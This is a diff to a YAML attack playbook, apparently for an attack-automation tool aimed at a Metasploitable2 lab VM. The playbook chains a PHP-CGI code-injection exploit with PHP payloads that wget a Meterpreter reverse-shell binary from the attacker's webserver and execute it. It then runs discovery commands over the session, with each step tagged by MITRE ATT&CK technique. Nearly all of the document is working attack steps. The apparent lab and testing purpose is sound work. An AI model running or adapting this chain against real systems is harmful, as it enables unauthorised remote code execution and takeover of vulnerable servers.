@@ -1,5 +1,5 @@
 #
-# Author: Wolfgang Hotwagner
+# Author: Wolfgang Hotwagner, Erik Grafendorfer
 # Description:
 #     This playbook perfoms the following attack-steps:
 #     1. Create a temporary file for the reverse-shell payload
@@ -13,21 +13,24 @@
 # Requirements:
 #     1. Run this on kali-linux
 #     2. Metasploit installed and msfrpd executed
-#     3. Install curl
-#     4. Target a Metasploitable2-VM
+#     3. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  ATTACKER: 172.17.0.127
+  METASPLOITABLE: 192.168.0.146
+  ATTACKER: 192.168.0.29
   PAYLOAD: linux/x86/meterpreter/reverse_tcp
-  LPORT: 4344
-  CURL: 'curl -XPOST "http://172.17.0.106/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
+  LPORT: "4344"
+  PHP_CGI_URL: "http://192.168.0.146/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
+  PHP_DOWNLOAD: /tmp/attackmate_php_download.php
+  PHP_EXECUTE: /tmp/attackmate_php_execute.php
 
 commands:
   # create a temporary file for a reverse shell payload
   - type: mktemp
     cmd: file
     variable: RSHELL
+    metadata:
+      description: "Prepare directory for reverse shell"
 
   # generate reverse shell
   - type: msf-payload
@@ -37,16 +40,36 @@ commands:
       LPORT: $LPORT
     format: elf
     local_path: $RSHELL
+    metadata:
+      description: "Generate php reverse shell"
 
   # serve the reverse shell via webserver in background mode
   - type: webserv
     local_path: $RSHELL
     port: 8080
-    background: True
+    background: true
+    metadata:
+      description: "Serve reverse shell via webserver in background mode"
 
-  # Inject code that downloads the reverse shell from the webserver in background mode
+  # create raw PHP body for the download request
   - type: shell
-    cmd: "$CURL -d \"<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL')?>\""
+    cmd: "cat > $PHP_DOWNLOAD <<'EOF'\n<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL');?>\nEOF"
+    metadata:
+      description: "Prepare cgi exploit"
+
+  # Inject code that downloads the reverse shell from the webserver
+  - type: http-client
+    cmd: POST
+    url: $PHP_CGI_URL
+    headers:
+      Accept: "*/*"
+      Accept-Encoding: identity
+      Connection: close
+    local_path: $PHP_DOWNLOAD
+    metadata:
+      description: "Exploit php cgi code injection and place a payload for a reverse shell"
+      techniques: "T1190,T1059.004"
+      tactics: "Initial Access,Execution"
 
   # Start a reverse shell listener in background
   - type: msf-module
@@ -58,18 +81,45 @@ commands:
       LPORT: $LPORT
     background: true
     kill_on_exit: true
+    metadata:
+      description: "Start local listener for reverse shell"
+
+  # create raw PHP body for the execution request
+  - type: shell
+    cmd: "cat > $PHP_EXECUTE <<'EOF'\n<?php system('chmod +x /tmp/shell && /tmp/shell &');?>\nEOF"
+    metadata:
+      description: "create raw PHP body for the execution request"
 
   # Execute the reverse shell
-  - type: shell
-    cmd: "$CURL -d \"<?php system('chmod +x /tmp/shell && /tmp/shell &')?>\""
+  - type: http-client
+    cmd: POST
+    url: $PHP_CGI_URL
+    headers:
+      Accept: "*/*"
+      Accept-Encoding: identity
+      Connection: close
+    local_path: $PHP_EXECUTE
     background: true
     kill_on_exit: true
+    metadata:
+      description: "Exploit php cgi code injection and trigger the reverse shell"
+      techniques: "T1190,T1059.004"
+      tactics: "Initial Access,Execution"
 
   # Run commands using the reverse shell
   - type: msf-session
     session: shell
     cmd: sysinfo
+    metadata:
+      description: "Retrieve system information"
+      techniques: "T1082"
+      tactics: "Discovery"
 
   - type: msf-session
     session: shell
     cmd: getuid
+    metadata:
+      description: "Get information about current user"
+      techniques: "T1033"
+      tactics: "Discovery"
+
